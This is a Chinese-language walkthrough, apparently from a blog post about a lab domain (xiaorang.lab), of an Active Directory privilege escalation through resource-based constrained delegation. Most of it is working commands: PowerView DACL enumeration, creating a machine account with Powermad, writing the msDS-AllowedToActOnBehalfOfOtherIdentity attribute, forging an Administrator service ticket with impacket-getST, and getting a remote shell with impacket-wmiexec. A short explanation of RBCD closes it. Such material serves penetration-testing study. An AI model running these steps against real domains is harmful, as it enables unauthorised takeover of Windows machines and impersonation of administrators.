<!-- https://blog.csdn.net/longlangci/article/details/131686439 -->

- 前提: `GenericWrite` 权限

```bash
# 1. 枚举一下当前用户（lixiuying）对当前机器的DACL。
Import-Module .\PowerView.ps1
Get-DomainUser -Identity lixiuying -Properties objectsid
Get-DomainObjectAcl -Identity XR-0687 | ?{$_.SecurityIdentifier -match "S-1-5-21-3745972894-1678056601-2622918667-1131"}
## 看到 GenericWrite 权限 可以修改 XR-0687的任何属性, 可通过 RBCD 提权.
```

- 2.PowerMad 创建新的计算机账号 Test1$，密码 Test1234。

```ps1
Import-Module .\Powermad.ps1
# 设置机器账户的密码
$Password = ConvertTo-SecureString 'Test1234' -AsPlainText -Force
# 通过Net-MachineAccount函数创建机器账户
New-MachineAccount -MachineAccount "Test1" -Password $($Password) -Domain "xiaorang.lab" -DomainController "XR-DC01.xiaorang.lab" -verbose
```

- 3.通过 PowerView1 设置RBCD (Test1 到 XR-0687 的基于资源的约束性委派)

```ps1
# 将Test1的SID添加到XR-0687这台计算机对象的msDS-AllowedToActOnBehalfOfOtherIdentity属性中。

Import-Module .\PowerView.ps1
# 获取Test1账户的 SID
Get-NetComputer "Test1" -Properties objectsid
# 尝试配置Test1到XR-0687的基于资源的约束性委派
$A = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3745972894-1678056601-2622918667-1147)"
$SDBytes = New-Object byte[] ($A.BinaryLength)
$A.GetBinaryForm($SDBytes, 0)
Get-DomainComputer XR-0687 | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes} -Verbose
# 查看是否配置成功
Get-DomainComputer XR-0687 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

# 4.用 Test1 账户申请 XR-0687 机器上的CIFS服务的高权限票据。
```ps1
sudo vim /etc/hosts # 配置ipo
172.22.15.35 XR-0687.xiaorang.lab
proxychains4 impacket-getST xiaorang.lab/Test1\$:Test1234 -dc-ip 172.22.15.13 -spn cifs/XR-0687.xiaorang.lab -impersonate Administrator

# 使用申请的票据获取XR-0687这台机器的本地管理员权限。
export KRB5CCNAME=Administrator.ccache
proxychains4 impacket-wmiexec -k xiaorang.lab/Administrator@XR-0687.xiaorang.lab -no-pass
```

# 介绍

基于资源的约束委派

- 基于资源的约束委派 (Resource-Based Constrained Delegation， RBCD) 是在 Windows Server 2012 中新引入的功能。与传统的约束委派相比，它将设置委派的权限交换给了服务资源自身，也就是说服务自己可以决定“谁可以对我进行委派”。基于资源的约束委派的关键在于 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性的设置。
